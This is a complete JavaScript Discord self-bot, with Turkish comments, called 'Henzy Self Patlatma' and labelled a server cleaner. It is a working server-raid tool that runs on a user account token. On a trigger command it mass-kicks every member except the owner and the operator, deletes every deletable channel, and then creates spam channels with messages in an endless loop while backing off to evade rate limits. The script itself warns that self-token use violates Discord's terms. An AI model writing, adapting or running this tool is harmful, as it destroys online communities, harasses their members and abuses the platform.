const DISCORD_TOKEN = '';
const USER_ID = '';//Kullanıcak kişi idsi
const CHANNEL_NAME = '';//Kanal adı
const MESSAGE_CONTENT = '';//Mesaj içeriği
const SPAM_COUNT = 10;//Kaç kanal oluşturulacak
const SPAM_DELAY = 1000;//Kanal oluşturma aralığı

const { Client } = require('discord.js-selfbot-v13');

const CONFIG = {
    DISCORD_TOKEN: DISCORD_TOKEN,
    USER_ID: USER_ID,
    COMMAND_PREFIX: '.',
    DELAY: 500
};

class DiscordSelfPatlatma {
    constructor() {
        this.client = new Client({
            checkUpdate: false,
            autoRedeemNitro: false,
            ws: { properties: { browser: 'Discord Client' } }
        });

        this.commandPrefix = CONFIG.COMMAND_PREFIX;
        this.delay = CONFIG.DELAY;
        
        this.setupEventHandlers();
    }

    setupEventHandlers() {
        this.client.on('ready', () => {
            console.log('╔══════════════════════════════════════════════════════════════╗');
            console.log('║                    Henzy Self Patlatma                      ║');
            console.log('║                Discord Server Cleaner Tool                   ║');
            console.log('╠══════════════════════════════════════════════════════════════╣');
            console.log(`║ ✅ ${this.client.user.tag} (Kullanıcı Hesabı) olarak giriş yapıldı!`);
            console.log(`║ 🎯 Komut prefix: ${this.commandPrefix}`);
            console.log('║ 🎯 Komut kullanıldığı sunucu otomatik hedeflenecek');
            console.log('║ 🚀 Sunucu temizleme aracı hazır!');
            console.log('║ ⚠️  Self-token kullanımı Discord ToS\'a aykırıdır!');
            console.log('║ ⚠️  Hesap banlanması riski vardır!');
            console.log('╚══════════════════════════════════════════════════════════════╝');
            console.log('');
            console.log('📋 Komutlar:');
            console.log(`   ${this.commandPrefix}selam  - Sunucudaki tüm kanalları siler`);
            console.log('');
        });

        this.client.on('messageCreate', async (message) => {
            if (message.author.bot) return;
            if (message.author.id !== CONFIG.USER_ID) return;
            if (!message.content.startsWith(this.commandPrefix)) return;

            const command = message.content.slice(this.commandPrefix.length).trim().toLowerCase();

            if (command === 'selam') {
                await this.handleCleanCommand(message);
            }
        });

        this.client.on('error', (error) => {
            if (error.code !== 50013) {
                console.error('❌ Discord bağlantı hatası:', error.message);
            }
        });

        this.client.on('disconnect', () => {
            console.log('🔌 Discord bağlantısı kesildi!');
        });
    }

    async handleCleanCommand(message) {
        try {
            if (!message.member?.permissions.has('ManageChannels')) {
                try {
                    await message.reply('❌ Bu komutu kullanmak için "Kanalları Yönet" yetkisine sahip olmalısın!');
                } catch {}
                return;
            }

            const guild = message.guild;
            if (!guild) {
                try {
                    await message.reply('❌ Bu komut sadece sunucularda kullanılabilir!');
                } catch {}
                return;
            }

            console.log(`🎯 Hedef sunucu belirlendi: ${guild.name} (${guild.id})`);

            try {
                await message.reply('🚀 Sunucu temizleme başlatılıyor... Bu işlem geri alınamaz!');
            } catch {}

            console.log(`👥 Üyeler atılıyor...`);
            
            try {
                const members = await guild.members.fetch();
                let kickedCount = 0;
                
                const kickPromises = [];
                
                for (const [memberId, member] of members) {
                    if (member.id !== guild.ownerId && member.id !== CONFIG.USER_ID) {
                        kickPromises.push(
                            member.kick('Henzy Self Patlatma').then(() => {
                                kickedCount++;
                                console.log(`👢 Üye atıldı: ${member.user.username}`);
                            }).catch(() => {})
                        );
                    }
                }
                
                await Promise.all(kickPromises);
                
                console.log(`✅ ${kickedCount} üye aynı anda atıldı!`);
                
                try {
                    await message.reply(`👥 ${kickedCount} üye aynı anda atıldı! Kanal silme işlemi başlıyor...`);
                } catch {}
                
            } catch (memberError) {
                console.log(`❌ Üye atma hatası:`, memberError.message);
            }

            const channels = guild.channels.cache;
            let deletedCount = 0;
            let errorCount = 0;

            console.log(`🗑️ ${guild.name} sunucusunda ${channels.size} kanal bulundu`);

            const deletableChannels = channels.filter(channel => channel.deletable);
            
            console.log(`🚀 ${deletableChannels.size} kanal aynı anda siliniyor...`);

            deletableChannels.forEach(channel => {
                channel.delete().catch(() => {
                    errorCount++;
                });
                deletedCount++;
            });

            console.log(`🎉 ${deletedCount} kanal silme işlemi başlatıldı!`);
            
            try {
                await message.reply(`🚀 ${deletedCount} kanal aynı anda siliniyor!`);
            } catch {}

            console.log(`🚀 Spam modu başlatılıyor! Sürekli kanal oluşturulacak...`);

            let channelCount = 1;
            let delay = 100;
            let consecutiveErrors = 0;
            let lastResetTime = Date.now();
            
            while (true) {
                try {
                    const channelName = `${CHANNEL_NAME}-${channelCount}`;
                    const newChannel = await guild.channels.create(channelName, {
                        type: 0,
                        reason: 'Henzy Self Patlatma'
                    });

                    console.log(`✅ Kanal oluşturuldu: ${channelName}`);
                    consecutiveErrors = 0;
                    delay = Math.max(50, delay - 10);

                    await this.sleep(200);

                    try {
                        await newChannel.send(MESSAGE_CONTENT);
                        console.log(`📨 Mesaj gönderildi: ${channelName}`);
                    } catch (sendError) {
                        console.log(`⚠️ Mesaj gönderilemedi: ${channelName}`);
                    }

                } catch (createError) {
                    consecutiveErrors++;
                    delay = Math.min(2000, delay * 1.5);
                    console.log(`⚠️ Rate limit! ${delay}ms bekleniyor... (Hata: ${consecutiveErrors})`);
                    
                    if (consecutiveErrors >= 5) {
                        console.log(`🔄 5 saniye bekleniyor ve hız sıfırlanıyor...`);
                        await this.sleep(5000);
                        delay = 100;
                        consecutiveErrors = 0;
                        lastResetTime = Date.now();
                        console.log(`🚀 Hız sıfırlandı! Tekrar hızlı başlıyor...`);
                    }
                }

                channelCount++;
                await this.sleep(delay);
            }

        } catch (error) {
            console.error('❌ Sunucu temizleme hatası:', error.message);
            try {
                await message.reply(`❌ Hata oluştu: ${error.message}`);
            } catch {}
        }
    }

    sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    start() {
        const token = CONFIG.DISCORD_TOKEN;
        const userId = CONFIG.USER_ID;
        
        if (!token || token === 'your_discord_self_token_here') {
            console.error('❌ Discord self-token bulunamadı!');
            console.error('📝 CONFIG.DISCORD_TOKEN değişkenine Discord self-token\'ınızı ekleyin.');
            process.exit(1);
        }

        if (!userId || userId === 'YOUR_USER_ID_HERE') {
            console.error('❌ Kullanıcı ID bulunamadı!');
            console.error('📝 CONFIG.USER_ID değişkenine Discord kullanıcı ID\'nizi ekleyin.');
            process.exit(1);
        }

        console.log('🚀 Discord Self Patlatma (Kullanıcı Hesabı) başlatılıyor...');
        console.log('⚠️  UYARI: Self-token kullanımı Discord ToS\'a aykırıdır!');
        console.log('⚠️  Hesap banlanması riski vardır!');
        console.log(`🔒 Sadece ${userId} ID'li kullanıcı komutları kullanabilir!`);
        console.log('');
        
        this.client.login(token);
    }
}

const app = new DiscordSelfPatlatma();
app.start();

process.on('SIGINT', () => {
    console.log('\n👋 Uygulama kapatılıyor...');
    process.exit(0);
});

process.on('unhandledRejection', (error) => {
    console.error('❌ İşlenmeyen hata:', error);
});

process.on('uncaughtException', (error) => {
    console.error('❌ Yakalanmamış hata:', error);
    process.exit(1);
});
